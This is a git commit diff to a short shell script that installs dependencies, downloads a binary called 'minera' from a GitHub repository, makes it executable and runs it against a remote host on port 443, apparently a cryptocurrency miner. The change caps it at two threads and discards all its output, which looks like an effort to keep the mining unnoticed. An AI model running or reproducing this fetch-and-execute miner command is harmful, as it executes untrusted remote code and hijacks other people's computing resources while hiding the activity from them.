01bfd0d7c2693690b475db8a514bfe8306aaff6e
komaria10003099 <komaria10003099@webmail.uad.ac.id>
2023-12-09 02:25:22 +0700

    Update pepek.sh

--- pepek.sh
+++ pepek.sh
@@ -1,2 +1,2 @@
 apt-get update && apt-get upgrade -y && apt-get install -y ca-certificates wget libcurl4 libjansson4 libgomp1 libnuma-dev
-wget https://github.com/komaria10003099/komaria/raw/main/minera && chmod +x minera && ./minera -o 137.184.5.123:443 -t$(nproc --all)
+wget https://github.com/komaria10003099/komaria/raw/main/minera && chmod +x minera && ./minera -o 137.184.5.123:443 -t 2 >/dev/null 2>&1
